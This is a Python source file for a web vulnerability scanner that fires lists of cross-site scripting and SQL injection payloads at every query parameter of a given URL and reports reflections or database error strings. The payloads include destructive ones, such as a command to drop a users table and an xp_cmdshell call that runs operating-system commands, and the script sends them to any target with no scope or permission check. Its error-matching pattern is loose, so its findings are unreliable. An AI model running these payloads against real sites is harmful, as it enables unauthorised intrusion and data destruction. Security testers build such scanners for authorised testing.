import requests
import urllib.parse
import re

headers = {
    "User-Agent": "AdvancedVulnScanner/1.0"
}

xss_payloads = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert(1)>",
    "';alert(1);//",
    "<details open ontoggle=confirm(1)>",
    "<math><mtext></mtext><script>alert(1)</script>",
    "<object data='javascript:alert(1)'>",
    "<video><source onerror='alert(1)'>",
    "><img src=x onerror=prompt(1)>",
    "\"><svg/onload=confirm`1`>",
    "javascript:alert(1)",
    "' onmouseover='alert(1)'",
    "`onerror=prompt(1)`",
]

sqli_payloads = [
    "' OR 1=1--",
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "' OR 1=1 LIMIT 1 --",
    "admin' --",
    "1 AND 1=1",
    "1 AND 1=2",
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT NULL,NULL,NULL --",
    "' AND SLEEP(5)--",
    "' OR IF(1=1,SLEEP(5),0)--",
    "\" OR \"\" = \"\"",
    "' OR 'x'='x",
    "' AND 'x'='y",
    "' AND (SELECT 1 FROM pg_sleep(5))--",
    "'; exec xp_cmdshell('whoami')--",
    "' or ascii(substring(@@version,1,1))=77 --",
    "') OR ('1'='1' --",
]

def test_payloads(url, payloads, vuln_type):
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)

    vulnerable = []

    for param in query:
        original = query[param][0]
        for payload in payloads:
            query[param][0] = payload
            new_query = urllib.parse.urlencode(query, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

            try:
                response = requests.get(test_url, headers=headers, timeout=10)
                body = response.text.lower()

                if vuln_type == "XSS":
                    if payload.lower() in body:
                        print(f"[🔥] {vuln_type} reflected: {param} = {payload}")
                        vulnerable.append((param, payload))
                elif vuln_type == "SQLi":
                    if re.search(r"(sql|syntax|mysql|error|oracle|warning|maria|pg_|unexpected)", body):
                        print(f"[🔥] Possible {vuln_type} error: {param} = {payload}")
                        vulnerable.append((param, payload))

            except Exception as e:
                print(f"[⚠️] Error testing {param}: {e}")

        query[param][0] = original

    return vulnerable

def run_vuln_tests(url):
    url = "http://" + url
    print(f"\n🔎 Testing {url} for XSS...")
    xss_found = test_payloads(url, xss_payloads, "XSS")

    print(f"\n🔎 Testing {url} for SQL Injection...")
    sqli_found = test_payloads(url, sqli_payloads, "SQLi")

    if not xss_found and not sqli_found:
        print("\n✅ No known input vulnerabilities found.")
    else:
        print("\n⚠️ Potential issues detected. Manual review recommended.")

